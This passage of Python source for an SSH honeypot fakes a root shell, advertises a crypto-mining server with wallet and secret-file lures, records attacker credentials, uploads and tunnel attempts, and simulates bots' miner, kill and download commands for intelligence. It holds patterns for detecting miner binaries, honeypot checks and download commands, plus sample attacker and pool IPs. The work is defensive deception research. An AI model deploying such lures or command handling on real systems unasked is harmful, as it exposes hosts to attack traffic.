        print(f"[service-kill] ip={src_ip} cmd={c[:80]}", flush=True)
        if sess is not None:
            sess.setdefault("service_kills", []).append(c[:80])
        return ""

    # --- Shell/script execution ----------------------------------------------
    if c.startswith("sh "):
        # sh -c 'CMD' / sh -c "CMD" — execute the inner command through fake_unix
        m_shc = re.match(r"sh\s+-c\s+['\"](.+?)['\"]$", c, re.DOTALL)
        if m_shc:
            return fake_unix(m_shc.group(1), src_ip=src_ip, sess=sess)
        script_name = c[3:].strip().split()[0]
        print(f"[sh-exec] ip={src_ip} script={script_name!r}", flush=True)
        if sess is not None and script_name in ("setup.sh", "clean.sh"):
            return _exec_shell_script(script_name, src_ip=src_ip, sess=sess)
        return ""
    if c.startswith("./"):
        print(f"[exec-binary] ip={src_ip} cmd={c[:120]!r}", flush=True)
        if sess is not None:
            sess.setdefault("binary_execs", []).append(c[:120])
        # Realistic miner startup: bot thinks miner is running, C2 config fetched
        if any(x in c for x in ("xmrig", "redtail", "miner", "srv", "kworker", "rt_probe")):
            return (
                f" * THREADS {_CPU} | HUGE PAGES 100% | MEMORY 2048.0 MB | algo rx/0\n"
                f" * POOL #0: 164.68.121.252:3333 | READY\n"
                f" * miner#0 READY threads={_CPU}/{_CPU} huge pages={_CPU}/{_CPU} 1100% memory=8.0 MB\n"
                f" * speed 10s/60s/15m: 45234.12 45180.45 45012.33 H/s max: 45891.23 H/s\n"
                f" * accepted (1/0) diff 400001 (12 ms)\n"
            )
        return ""
    if c.startswith(("chmod ", "rm ", "mkdir ", "mv ", "cp ", "touch ", "find ",
                      "export ", "source ", "eval ", "apt ", "apt-get ", "yum ", "dnf ")):
        return ""

    # --- cd: shell builtin, silent (incl. `cd`, `cd ~`, `cd /path`) -----------
    if c == "cd" or c.startswith("cd "):
        return ""

    # --- date: bots fingerprint clock/timezone -------------------------------
    if c == "date" or c.startswith("date "):
        return datetime.datetime.now(datetime.timezone.utc).strftime(
            "%a %b %d %H:%M:%S UTC %Y") + "\n"

    # --- docker: environment fingerprinting (is this a container host?) -------
    if c == "docker" or c.startswith("docker "):
        if c.startswith(("docker ps", "docker container ls")):
            # Plausible: docker installed, miner running in a container.
            if "--format" in c:
                return "xmrig-node  Up 6 days\n"
            return ("CONTAINER ID   IMAGE                 COMMAND        CREATED      STATUS       PORTS     NAMES\n"
                    "a3f9c2e81b04   xmrig/xmrig:latest    \"/xmrig\"       6 days ago   Up 6 days              xmrig-node\n")
        if c.startswith("docker images"):
            return ("REPOSITORY      TAG       IMAGE ID       CREATED      SIZE\n"
                    "xmrig/xmrig     latest    7c4a9f2e1d83   3 weeks ago  18.4MB\n")
        if c.startswith(("docker version", "docker --version", "docker -v")):
            return "Docker version 24.0.7, build afdd53b\n"
        return ""

    # --- ls with a path/args (bare `ls`/`ls -la` handled in dict) -------------
    if c.startswith("ls "):
        arg = c[3:].strip()
        if "/opt" in arg:
            return "miner  cuda  scripts\n"
        if "/tmp" in arg:
            return ".x  .ssh-guard  systemd-private-a3f9\n"
        if "/root" in arg or "~" in arg:
            return "xmrig  srbminer  scripts  share  config.json  miner.log\n"
        if "/etc" in arg:
            return "passwd  shadow  hosts  crontab  ssh  systemd  cron.d\n"
        # generic: empty dir / quiet success
        return ""

    if c in ("", " ", "\n"):
        return ""
    # AI strategist: observe this command and, if it already chose an active
    # tactic with a concrete suggested response, steer with it. Falls through to
    # the LLM shell / bash error otherwise (deterministic fallback always wins).
    if _strat is not None and sess is not None:
        try:
            sid = sess.get("sid", "")
            _strat.note(sid, "ssh", c, src_ip=src_ip, unhandled=True)
            tac = _strat.stance(sid)
            if tac and tac.get("stance") in ("engage", "mimic_vuln", "probe"):
                sug = (tac.get("suggestion") or "").strip()
                if sug:
                    _strat.record_outcome(sid, f"steered:{tac['stance']}")
                    print(f"[strategist] ssh steer ip={src_ip} "
                          f"stance={tac['stance']} cmd={c[:40]!r}", flush=True)
                    return sug if sug.endswith("\n") else sug + "\n"
        except Exception:
            pass
    # Unknown command → LLM-backed shell (persona-aware) before bash's error.
    # Only novel commands reach here; common ones are handled deterministically
    # above, so the LLM is hit rarely and cached.
    if _persona is not None and sess is not None:
        try:
            p = _persona.pick_persona(sess)
            ans = _persona.llm_answer(c, p, sess.get("commands", []))
            if ans:
                print(f"[llm-shell] ip={src_ip} cmd={c[:60]!r}", flush=True)
                return ans
        except Exception:
            pass
    # Fallback: bash-style error
    cmd_name = c.split()[0] if c.split() else c
    return f"-bash: {cmd_name}: command not found\n"


def _exec_shell_script(script_name, src_ip=None, sess=None):
    """Parse a captured shell script and simulate intel-relevant commands.
    Called when fake_unix sees 'sh clean.sh' or 'sh setup.sh' — instead of
    returning '' we actually walk the script and fire pkill/exec/wget lines
    through fake_unix so they land in sess and ultimately in the event JSON.
    """
    # Look in current session first, then fall back to cross-session global cache
    path = next((u["path"] for u in (sess or {}).get("uploads", []) if u.get("name") == script_name), None)
    if not path:
        with _SCRIPTS_LOCK:
            path = _KNOWN_SCRIPTS.get(script_name)
    if not path:
        return ""
    try:
        content = open(path, "rb").read().decode("latin-1", "replace")
    except OSError:
        return ""
    print(f"[script-sim] ip={src_ip} simulating {script_name!r} ({len(content)}B)", flush=True)

    out_parts = []
    in_func = False
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith('#'):
            continue
        # Track bash function bodies (skip contents)
        if re.match(r'^\w[\w_]*\s*\(\)\s*\{', line):
            in_func = True; continue
        if line == '}' and in_func:
            in_func = False; continue
        if in_func:
            continue
        # Skip control flow / variable assignments
        if re.match(r'^(if|elif|else|fi|for|do|done|while|case|esac|break|continue|return)\b', line):
            continue
        if re.match(r'^[A-Z_][A-Z_0-9]*=', line):
            continue
        if re.match(r'^\[.*\]', line) or re.match(r'^test\s', line):
            continue
        # Expand known shell variables
        cmd = line
        cmd = re.sub(r'\$\{?ARCH\}?', 'x86_64', cmd)
        cmd = re.sub(r'\$\{?FILENAME\}?', './.rt_probe', cmd)
        cmd = re.sub(r'\$\(whoami\)', 'root', cmd)
        cmd = re.sub(r'\$\(pwd[^)]*\)', '/root', cmd)
        cmd = re.sub(r'\s*2>/dev/null', '', cmd)        # stderr redirect only, keep pipe
        cmd = re.sub(r'\s*>/dev/null\s*$', '', cmd)   # stdout redirect only at end
        cmd = re.sub(r'\s*\|\|\s*.*$', '', cmd)
        cmd = re.sub(r'\s*&&\s*.*$', '', cmd)
        cmd = cmd.strip()
        if not cmd:
            continue
        # echo >FILE → competing malware binary being wiped (high-value intel)
        m = re.match(r'^echo\s+>(\/\S+)', cmd)
        if m:
            fpath = m.group(1)
            print(f"[wipe-binary] ip={src_ip} path={fpath}", flush=True)
            sess.setdefault("wiped_binaries", []).append(fpath)
            continue
        # Extract: kill/exec/download/service commands + any pipeline (|) for IOC capture
        first_word = cmd.split()[0].lstrip('./')
        if first_word in ('pkill', 'killall', 'kill', 'wget', 'curl', 'tftp', 'systemctl') \
                or cmd.startswith('./') or '|' in cmd:
            result = fake_unix(cmd, src_ip=src_ip, sess=sess)
            if result and result.strip() and 'command not found' not in result:
                out_parts.append(result)

    return "".join(out_parts)


def _exec_compound(cmd_str, src_ip=None, sess=None):
    """Split a shell compound command on ';' and run each part through fake_unix.
    This is necessary because bots send the entire install chain as one exec
    request (e.g. chmod ...; sh ...; echo key > authorized_keys; uname -a).
    """
    print(f"[exec-compound] ip={src_ip} cmd={cmd_str[:60]!r}", flush=True)

    # Record this exec into the session replay so the dashboard can play it back.
    # Exec-mode bots never hit _interactive(), so without this replay stays empty.
    def _rec(inp=None, out=None):
        if sess is None:
            return
        rp = sess.setdefault("replay", [])
        t0 = sess.setdefault("_replay_t0", time.time())
        off = round((time.time() - t0) * 1000)
        if inp is not None:
            rp.append({"t": off, "i": inp})
        if out is not None:
            rp.append({"t": off, "o": out})

    _rec(inp=cmd_str)

    # Honeypot-detector script — intercept the whole blob to avoid garbled output
    # from per-part splitting, and return the correct verdict in one shot.
    if "SSH_HONEYPOT" in cmd_str and "SSH_REAL" in cmd_str:
        print(f"[hp-detect-intercept] ip={src_ip} → SSH_REAL=1", flush=True)
        out = (f"SSH_OK\nuid=0(root) gid=0(root) groups=0(root),44(video)\n"
               f"{_HOST}\nSSH_REAL=1\n")
        _rec(out=out)
        return out

    # GPU fingerprinter (91.92.40.4 pattern) — script uses $() subshells and
    # variable expansion; we simulate the expected output directly so the C2
    # receives convincing GPU data and (hopefully) sends us a miner binary.
    if 'echo "UNAME:' in cmd_str and 'echo "GPU:' in cmd_str and "lspci" in cmd_str:
        print(f"[gpu-fingerprint-intercept] ip={src_ip} → returning GPU data", flush=True)
        out = (
            f"UNAME:Linux #55-Ubuntu SMP Mon Jun 10 14:22:11 UTC 2026 {_HOST} x86_64\n"
            f"ARCH:x86_64\n"
            f"UPTIME:7596342\n"
            f"CPUS:{_CPU}\n"
            f"CPU_MODEL:Intel(R) Xeon(R) Platinum 8480+\n"
            f"GPU:00:02.0 VGA compatible controller: NVIDIA Corporation GA102 [GeForce RTX 3090 Ti] (rev a1)\n"
            f"00:01.0 3D controller: NVIDIA Corporation GA100 [A100 SXM4 80GB] (rev a1)\n"
            f"CAT_HELP:Usage: cat [OPTION]... [FILE]...  GNU coreutils 8.32  "
            f"<https://www.gnu.org/software/coreutils/>\n"
            f"LS_HELP:Usage: ls [OPTION]... [FILE]...  GNU coreutils 8.32  "
            f"<https://www.gnu.org/software/coreutils/>\n"
            f"LAST:root     pts/0        130.12.180.51    Sat Jun 16 03:38   still logged in\n"
            f"root     pts/0        130.12.180.51    Sat Jun 16 02:55 - 03:01  (00:06)\n"
        )
        _rec(out=out)
        return out

    global _CANARY_TRIGGERED
    parts = [p.strip() for p in cmd_str.split(";")]
    out_parts = []
    for part in parts:
        if part:
            _CANARY_TRIGGERED = None
            result = fake_unix(part, src_ip=src_ip, sess=sess)
            # Capture EVERY canary hit in a compound (global is overwritten per part,
            # so record it here before the next part clobbers it).
            if _CANARY_TRIGGERED and sess is not None:
                dt = sess.setdefault("data_theft", [])
                if _CANARY_TRIGGERED not in dt:
                    dt.append(_CANARY_TRIGGERED)
            if result:
                out_parts.append(result)
    out = "".join(out_parts)
    _rec(out=out)
    return out


class _Server(paramiko.ServerInterface):
    def __init__(self, src_ip=""):
        self.src_ip = src_ip
        self.sess = {"creds": [], "pubkeys": [], "commands": [], "channels": [],
                     "relay": [], "relay_data": [], "uploads": [],
                     "sid": __import__("uuid").uuid4().hex[:12]}
        self.ev = threading.Event()
        self.is_sftp = False
        self._auth_given = False  # True once we grant access this session
        self._auth_count = 0      # password attempts this session

    def check_channel_subsystem_request(self, channel, name):
        if name == "sftp":
            self.is_sftp = True
        self.ev.set()
        return super().check_channel_subsystem_request(channel, name)

    def get_allowed_auths(self, username):
        # Once a key is installed for this IP: advertise publickey only,
        # just like a real server after PasswordAuthentication is locked out.
        if _INSTALLED_KEYS.get(self.src_ip):
            return "publickey"
        return "password,publickey"

    def check_auth_password(self, username, password):
        self.sess["creds"].append(f"{username}:{password}")
        if _INSTALLED_KEYS.get(self.src_ip):
            return paramiko.AUTH_FAILED
        # Anti-honeypot detection creds always fail.
        if (username, password) in _HONEYPOT_TEST_CREDS or password.endswith(_HONEYPOT_TEST_PASS_SUFFIX):
            return paramiko.AUTH_FAILED

        ip = self.src_ip
        with _CREDS_LOCK:
            established = _IP_CRED.get(ip)

        # This IP already has its ONE working credential (a real box has one PW).
        if established is not None:
            if [username, password] == established and not self._auth_given:
                self._auth_given = True
                self.sess["auth_ok"] = True
                self.sess["accepted_cred"] = f"{username}:{password}"
                return paramiko.AUTH_SUCCESSFUL
            # any OTHER password from this IP fails — exactly like a real server,
            # so brute-forcing different passwords no longer "always works".
            return paramiko.AUTH_FAILED

        # First credential this IP ever presents becomes THE valid one.
        if not self._auth_given:
            self._auth_given = True
            self.sess["auth_ok"] = True
            self.sess["accepted_cred"] = f"{username}:{password}"
            with _CREDS_LOCK:
                if len(_IP_CRED) >= _IPCRED_MAX:
                    _IP_CRED.pop(next(iter(_IP_CRED)), None)
                _IP_CRED[ip] = [username, password]
                _ipcred_save()
                _VALID_CREDS.add((username, password)); _creds_save()
            print(f"[ssh-creds] {ip} established cred: {username}:{password}", flush=True)
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        b64 = key.get_base64()
        installed = _INSTALLED_KEYS.get(self.src_ip, set())
        is_backdoor = any(b64 in stored for stored in installed)
        tag = ":backdoor" if is_backdoor else ""
        self.sess["pubkeys"].append(f"{username}:{key.get_name()}{tag}")
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_request(self, kind, chanid):
        self.sess["channels"].append(kind)
        if kind in ("session", "direct-tcpip"):
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_direct_tcpip_request(self, chanid, origin, destination):
        # The RELAY/tunnel attempt. Record target; accept the channel only so we
        # can read what they would push — we NEVER connect/forward it.
        self.sess["relay"].append({"origin": list(origin), "dest": list(destination)})
        self.ev.set()   # wake _handle immediately — don't waste the 8s ev.wait
        return paramiko.OPEN_SUCCEEDED

    def check_channel_exec_request(self, channel, command):
        self.sess["commands"].append(command.decode("latin-1", "replace"))
        self.ev.set()
        return True

    def check_channel_shell_request(self, channel):
        self.ev.set()
        return True

    def check_channel_pty_request(self, *a):
        return True


def _interactive(chan, srv, src_ip=""):
    try:
        # Persona-aware identity for the banner + prompt.
        _p = _persona.pick_persona(srv.sess) if _persona is not None else None
        _host = _p["host"] if _p else _HOST
        _user = _p.get("user", "root") if _p else "root"
        prompt = f"{_user}@{_host}:~# "

        _now = datetime.datetime.now(datetime.timezone.utc)
        _login_ts = _now.strftime("%a %b %d %H:%M:%S %Y")
        _xmr_bal  = f"{12.847 + (_now.minute * 0.003):.3f}"  # drifts slightly
        if _host == "gpu-node-07":
            banner = (
                f"Last login: {_login_ts} from 185.220.101.42\r\n\r\n"
                f"  ╔══ {_host} ── XMRig v6.22.0 ══════════════════════════════════╗\r\n"
                f"  ║  Load:    255.15  ({_CPU} cores, all pegged)                     ║\r\n"
                f"  ║  Mining:  452 kH/s  pool.hashvault.pro:443  [CONNECTED]        ║\r\n"
                f"  ║  Wallet:  {_xmr_bal} XMR  (≈ $2,640 USD)   [~/.wallet]        ║\r\n"
                f"  ║  BTC:     see ~/wallet.dat                                     ║\r\n"
                f"  ║  GPU:     8x A100-SXM4-80GB  @ 99%                            ║\r\n"
                f"  ╚═══════════════════════════════════════════════════════════════╝\r\n\r\n"
                f"  [!] Deploy key:  /root/.ssh/id_ed25519   (DO NOT SHARE)\r\n"
                f"  [!] Env/secrets: /root/.env               (API keys inside)\r\n"
                f"  [!] Pool config: ~/config.json\r\n\r\n"
            )
        else:
            banner = (
                f"Last login: {_login_ts} from 10.0.4.12\r\n\r\n"
                f"  * Production application server ({_host})\r\n"
                f"  * Ubuntu 22.04.4 LTS — managed by Ansible\r\n"
                f"  * Deploy user — sudo access. Config in ~/.env / ~/terraform.tfstate\r\n\r\n"
            )
        chan.send((banner + prompt).encode())
        chan.settimeout(25)
        buf = b""
        replay = srv.sess.setdefault("replay", [])
        t0 = time.time()

        def _replay_out(text: str):
            replay.append({"t": round((time.time()-t0)*1000), "o": text})

        for _ in range(60):
            try:
                r = chan.recv(4096)
            except Exception:
                break
            if not r:
                break
            buf += r
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                cmd = line.decode("latin-1", "replace").strip("\r ")
                if not cmd:
                    chan.send(prompt)
                    continue
                replay.append({"t": round((time.time()-t0)*1000), "i": cmd})
                srv.sess["commands"].append(cmd)
                if cmd in ("exit", "logout", "quit"):
                    chan.send("logout\r\n")
                    return
                global _CANARY_TRIGGERED
                _CANARY_TRIGGERED = None
                resp = fake_unix(cmd, src_ip=src_ip, sess=srv.sess)
                if _CANARY_TRIGGERED:
                    srv.sess.setdefault("data_theft", []).append(_CANARY_TRIGGERED)
                chan.send(resp)
                chan.send(prompt)
                _replay_out(resp + prompt)
    except Exception:
        pass


def _scp_sink(chan, command, sess):
    """Receive files via the SCP protocol (client ran `scp -t <path>`)."""
    try:
        chan.settimeout(20)
        chan.send(b"\x00")                       # ready
        while True:
            line = b""
            while not line.endswith(b"\n"):
                c = chan.recv(1)
                if not c:
                    return
                line += c
            line = line.rstrip(b"\n")
            if not line:
                continue
            tag = line[:1]
            if tag in (b"T", b"E"):              # times / end-dir
                chan.send(b"\x00"); continue
            if tag == b"D":                      # entering directory
                chan.send(b"\x00"); continue
            if tag == b"C":                      # C<mode> <size> <name>
                try:
                    parts = line[1:].split(b" ", 2)
                    size = int(parts[1])
                    name = parts[2].decode("latin-1", "replace")
                except Exception:
                    chan.send(b"\x00"); continue
                chan.send(b"\x00")               # ack header
                data = b""
                while len(data) < size:
                    c = chan.recv(min(65536, size - len(data)))
                    if not c:
                        break
                    data += c
                try:
                    chan.recv(1)                 # trailing status byte
                except Exception:
                    pass
                _save_upload(name, data, sess)
                chan.send(b"\x00")               # ack file
            else:
                return
    except Exception:
        return


class _SFTPHandle(paramiko.SFTPHandle):
    def __init__(self, path, sess):
        super().__init__(0)
        self._path = path
        self._sess = sess
        self._buf = bytearray()

    def write(self, offset, data):
        self._buf.extend(data)
        if len(self._buf) > 64 * 1024 * 1024:
            return paramiko.SFTP_FAILURE
        return paramiko.SFTP_OK

    def close(self):
        try:
            _save_upload(self._path, bytes(self._buf), self._sess)
        except Exception:
            pass
        return paramiko.SFTP_OK


class _SFTP(paramiko.SFTPServerInterface):
    def __init__(self, server, sess=None, *a, **k):
        super().__init__(server, *a, **k)
        self._sess = sess

    def open(self, path, flags, attr):
        if flags & (os.O_WRONLY | os.O_RDWR | os.O_CREAT | os.O_APPEND):
            return _SFTPHandle(path, self._sess)
        return paramiko.SFTP_PERMISSION_DENIED

    def list_folder(self, path):
        return paramiko.SFTP_NO_SUCH_FILE

    def stat(self, path):
        return paramiko.SFTP_NO_SUCH_FILE

    def lstat(self, path):
        return paramiko.SFTP_NO_SUCH_FILE


def _relay_banner(dport: int) -> bytes:
    """A plausible server-first greeting for the tunnel's destination port, so a
    bot waiting for the peer to speak first believes the relay is live."""
    if dport in (25, 465, 587, 2525):
        return b"220 mail.local ESMTP Postfix (Ubuntu)\r\n"
    if dport in (21,):
        return b"220 (vsFTPd 3.0.5)\r\n"
    if dport in (3306,):
        return b"\x4a\x00\x00\x00\x0a8.0.36\x00"        # MySQL-ish handshake start
    # Default (incl. the 2535 C2): most proxy-recruiters expect an SSH peer.
    return b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n"


def _relay_respond(chan, data: bytes, rd: list):
    """Answer the bot's tunnelled payload convincingly so it keeps talking."""
    head = data[:16].lstrip()
    try:
        if head[:7] == b"CONNECT":
            r = b"HTTP/1.1 200 Connection established\r\n\r\n"
        elif head[:4] in (b"GET ", b"POST", b"HEAD", b"PUT ", b"OPTI"):
            body = b"OK\n"
            r = (b"HTTP/1.1 200 OK\r\nServer: nginx\r\n"
                 b"Content-Length: %d\r\nConnection: keep-alive\r\n\r\n%s" % (len(body), body))
        elif head[:4] in (b"EHLO", b"HELO"):
            r = b"250-mail.local\r\n250 OK\r\n"
        elif head[:4] == b"MAIL":
            r = b"250 2.1.0 Ok\r\n"
        elif head[:4] == b"RCPT":
            r = b"250 2.1.5 Ok\r\n"
        elif head[:4] == b"DATA":
            r = b"354 End data with <CR><LF>.<CR><LF>\r\n"
        elif head[:5] == b"QUIT\r" or head[:4] == b"QUIT":
            r = b"221 Bye\r\n"
        else:
            return  # unknown protocol → stay silent, keep reading
        chan.send(r)
        rd.append("<< " + r[:200].decode("latin-1", "replace"))
    except Exception:
        pass


def _relay_pump(chan, dest, sess):
    """Keep a fake direct-tcpip relay alive and record what the bot pushes.
    We NEVER connect to `dest`; we synthesize plausible peer responses so the
    bot believes the tunnel is live and reveals its payload + protocol."""
    rd = sess.setdefault("relay_data", [])
    dport = dest[1] if isinstance(dest, (list, tuple)) and len(dest) > 1 else 0
    deadline = time.time() + 120

    # Phase 1 — give a client-first protocol (HTTP/SOCKS/custom) a moment to speak.
    chan.settimeout(4)
    try:
        first = chan.recv(65536)
    except socket.timeout:
        first = b""
    except Exception:
        return
    if first:
        rd.append(">> " + first[:4000].decode("latin-1", "replace"))
        _relay_respond(chan, first, rd)
    else:
        # Silence → server-first protocol. Pretend the destination greeted us.
        banner = _relay_banner(dport)
        try:
            chan.send(banner)
            rd.append("<< " + banner.decode("latin-1", "replace"))
        except Exception:
            return

    # Phase 2 — keep pumping, logging everything, until idle or 2 min.
    chan.settimeout(20)
    while time.time() < deadline and len(rd) < 200:
        try:
            data = chan.recv(65536)
        except socket.timeout:
            break
        except Exception:
            break
        if not data:
            break
        rd.append(">> " + data[:4000].decode("latin-1", "replace"))
        _relay_respond(chan, data, rd)


def _handle(client, addr, port, log_event, extract_iocs, capture_samples):
    ev = {"ts": datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z"),
          "src_ip": addr[0], "src_port": addr[1], "dst_port": port,
          "session_id": uuid.uuid4().hex[:12], "service": "ssh", "tls": False}
    srv = None
    t = None
    try:
        t = paramiko.Transport(client)
        t.local_version = BANNER
        t.add_server_key(_hostkey())
        srv = _Server(src_ip=addr[0])
        t.set_subsystem_handler("sftp", paramiko.SFTPServer, _SFTP, srv.sess)
        t.start_server(server=srv)
        chan = t.accept(15)
        srv.ev.wait(8)
        if chan is not None:
            global _CANARY_TRIGGERED
            if srv.is_sftp:                       # SFTP upload (paramiko handles channel I/O)
                deadline = time.time() + 45
                while t.is_active() and not chan.closed and time.time() < deadline:
                    time.sleep(0.5)
                # Bot sends install chain on a second channel after SFTP upload
                deadline2 = time.time() + 5
                while len(srv.sess["commands"]) < 1 and time.time() < deadline2:
                    time.sleep(0.05)
                if srv.sess["commands"]:
                    chan2 = t.accept(5)
                    if chan2 is not None:
                        deadline3 = time.time() + 3
                        while len(srv.sess["commands"]) < 1 and time.time() < deadline3:
                            time.sleep(0.05)
                        for c in srv.sess["commands"]:
                            try:
                                _CANARY_TRIGGERED = None
                                out = _exec_compound(c, src_ip=addr[0], sess=srv.sess)
                                if _CANARY_TRIGGERED:
                                    srv.sess.setdefault("data_theft", []).append(_CANARY_TRIGGERED)
                                chan2.send(out.encode() if isinstance(out, str) else out)
                            except Exception:
                                break
                        try:
                            chan2.close()
                        except Exception:
                            pass
            elif srv.sess["relay"]:               # tunnel/relay attempt — fake the peer, log payload
                try:
                    dest = srv.sess["relay"][0].get("dest", [None, 0])
                    _relay_pump(chan, dest, srv.sess)
                except Exception:
                    pass
                try:
                    chan.close()
                except Exception:
                    pass
            elif srv.sess["commands"]:            # exec request (incl. scp upload)
                cmd0 = srv.sess["commands"][0]
                if cmd0.startswith("scp ") and "-t" in cmd0:
                    _scp_sink(chan, cmd0, srv.sess)
                    try:
                        chan.close()
                    except Exception:
                        pass
                    # Bot typically opens a second channel for the install chain
                    chan2 = t.accept(8)
                    if chan2 is not None:
                        # Wait up to 3s for the exec request to land
                        deadline = time.time() + 3
                        while len(srv.sess["commands"]) < 2 and time.time() < deadline:
                            time.sleep(0.05)
                        for c in srv.sess["commands"][1:]:
                            try:
                                _CANARY_TRIGGERED = None
                                out = _exec_compound(c, src_ip=addr[0], sess=srv.sess)
                                if _CANARY_TRIGGERED:
                                    srv.sess.setdefault("data_theft", []).append(_CANARY_TRIGGERED)
                                chan2.send(out.encode() if isinstance(out, str) else out)
                            except Exception:
                                break
                        try:
                            chan2.close()
                        except Exception:
                            pass
                else:
                    for c in srv.sess["commands"]:
                        try:
                            _CANARY_TRIGGERED = None
                            out = _exec_compound(c, src_ip=addr[0], sess=srv.sess)
                            if _CANARY_TRIGGERED:
                                srv.sess.setdefault("data_theft", []).append(_CANARY_TRIGGERED)
                            if isinstance(out, str):
                                chan.send(out.encode())
                            else:
                                chan.send(out)
                        except Exception:
                            break
                    try:
                        chan.close()
                    except Exception:
                        pass
            else:                                 # interactive shell
                _interactive(chan, srv, src_ip=addr[0])
                try:
                    chan.close()
                except Exception:
                    pass
    except Exception as e:
        ev["error"] = "ssh: " + str(e)
    finally:
        try:
            t.close()
        except Exception:
            pass

    if srv is not None:
        s = srv.sess
        relay = s["relay"]
        uploads = s["uploads"]
        data_theft = s.get("data_theft", [])
        wallet_steals = s.get("wallet_steals", [])

        # ── Omicron worm fingerprint: SSH-2.0-ROLLBACK banner ──────────────
        # Detected via paramiko transport after handshake completes.
        client_banner = ""
        try:
            client_banner = (t.remote_version or "") if t else ""
        except Exception:
            pass
        if client_banner:
            ev["ssh_client_banner"] = client_banner
            if "ROLLBACK" in client_banner:
                ev["malware_family"] = "omicron-worm"
                ev["zero_day_score"]  = 0
                print(f"[ssh] OMICRON WORM detected from {addr[0]}: {client_banner}", flush=True)

        if uploads:
            lure = "ssh-upload"
            path = "upload:" + ",".join(u["name"] for u in uploads)[:80]
        elif relay:
            lure = "ssh-relay"
            d = relay[0]["dest"]
            path = f"relay->{d[0]}:{d[1]}"
        elif data_theft:
            lure = "ssh-canary"
            path = "data-theft:" + ",".join(data_theft)
        elif wallet_steals:
            lure = "ssh-wallet-steal"
            first = wallet_steals[0]
            wallets = first.get("wallets", [])
            path = "wallet:" + (wallets[0]["addr"][:20] if wallets else first.get("dest", "?"))
        elif s["commands"]:
            lure = "ssh-shell"
            path = s["commands"][0]
        else:
            lure = "ssh-login"
            path = "(login only)"
        if ev.get("malware_family") == "omicron-worm" and lure == "ssh-login":
            lure = "omicron-ssh-worm"
        ev.update({
            "method": "SSH", "path": path, "lure": lure, "response_status": "OK",
            "ssh_creds": s["creds"][:25], "ssh_commands": s["commands"][:50],
            "ssh_auth_ok": bool(s.get("auth_ok")),
            "ssh_accepted_cred": s.get("accepted_cred"),
            # creds present but none accepted = failed brute-force attempt
            "ssh_brute_failed": bool(s["creds"]) and not s.get("auth_ok"),
            "ssh_pubkeys": s["pubkeys"][:10],
            "ssh_relay": relay, "ssh_relay_data": s["relay_data"],
            "ssh_replay": s.get("replay", [])[:200],
            "data_theft": data_theft,
            "net_downloads": s.get("net_downloads", [])[:20],
            "kill_targets": s.get("kill_targets", [])[:20],
            "pipelines": s.get("pipelines", [])[:20],
            "binary_execs": s.get("binary_execs", [])[:20],
            "service_kills": s.get("service_kills", [])[:20],
            "wiped_binaries": s.get("wiped_binaries", [])[:20],
            "wallet_steals": wallet_steals[:10],
            "ssh_uploads": [{"name": u["name"], "sha256": u["sha256"], "size": u["size"],
                             "filetype": u["filetype"]} for u in uploads],
            "body_preview": ("\n".join(s["commands"]) + "\n" + "\n".join(s["relay_data"]))[:4000],
        })
        blob = ("\n".join(s["commands"]) + "\n" + "\n".join(s["relay_data"])).encode("utf-8", "replace")
        try:
            ev["iocs"] = extract_iocs(blob)
        except Exception:
            ev["iocs"] = {"urls": []}
    log_event(ev)

    if srv is not None and srv.sess["uploads"]:   # uploaded files -> VT/YARA enrich + store
        log_event({"ts": datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z"),
                   "src_ip": ev["src_ip"], "session_id": ev["session_id"],
                   "event": "sample_capture", "captured_samples": srv.sess["uploads"]})

    urls = (ev.get("iocs") or {}).get("urls", [])
    if urls:
        try:
            samples = capture_samples(urls)
            if samples:
                log_event({"ts": datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z"),
                           "src_ip": ev["src_ip"], "session_id": ev["session_id"],
                           "event": "sample_capture", "captured_samples": samples})
        except Exception:
            pass


def _accept_loop(s, port, log_event, extract_iocs, capture_samples):
    while True:
        try:
            client, addr = s.accept()
        except Exception:
            continue
        threading.Thread(target=_handle,
                         args=(client, addr, port, log_event, extract_iocs, capture_samples),
                         daemon=True).start()


def start(ports, log_event, extract_iocs, capture_samples):
    _scripts_load()
    _hostkey()
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.listen(100)
            threading.Thread(target=_accept_loop,
                             args=(s, port, log_event, extract_iocs, capture_samples),
                             daemon=True).start()
            print(f"[win443-honeypot] SSH honeypot on 0.0.0.0:{port}", flush=True)
        except Exception as e:
            print(f"[win443-honeypot] SSH bind {port} failed: {e}", flush=True)
